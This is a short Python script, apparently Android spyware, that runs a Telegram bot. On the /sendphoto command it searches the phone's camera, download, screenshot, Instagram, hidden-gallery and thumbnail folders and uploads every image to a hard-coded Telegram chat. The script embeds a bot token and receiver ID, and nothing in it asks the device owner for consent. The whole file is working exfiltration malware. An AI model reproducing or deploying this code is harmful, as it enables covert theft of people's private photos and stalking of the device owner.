
import os
import telebot
from pathlib import Path

# ====== CONFIGURATION ======
BOT_TOKEN = "8396976496:AAG0xMbENOLIrNhABckHWf8tM130ACoXOl8"
RECEIVER_CHAT_ID = "6680989857"
bot = telebot.TeleBot(BOT_TOKEN)

# ====== IMAGE PATHS ======
image_dirs = [
    "/sdcard/Download", "/sdcard/DCIM/Camera", "/sdcard/Pictures",
    "/storage/emulated/0/Pictures/Instagram", "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/Pictures/Gallery/owner/hidden", "/storage/emulated/0/Pictures/.thumbnails",
    "/storage/emulated/0/DCIM/Screenshots", "/storage/emulated/0/Download", "/storage/emulated/0/Videos"
]

# ====== FETCH ALL IMAGES ======
def get_all_images():
    image_files = []
    for directory in image_dirs:
        try:
            for file in Path(directory).rglob("*"):
                if file.suffix.lower() in [".jpg", ".jpeg", ".png", ".bmp", ".webp"]:
                    image_files.append(str(file))
        except Exception:
            continue
    return image_files

# ====== LISTEN FOR /sendphoto COMMAND ======
@bot.message_handler(commands=['sendphoto'])
def send_all_images(message):
    bot.reply_to(message, "ðŸ“¤ Sending all images...")
    images = get_all_images()
    if not images:
        bot.send_message(message.chat.id, "âš ï¸ No images found.")
        return
    for img in images:
        try:
            with open(img, 'rb') as photo:
                bot.send_photo(RECEIVER_CHAT_ID, photo)
        except Exception as e:
            continue
    bot.send_message(message.chat.id, "âœ… Done sending images.")

bot.polling()
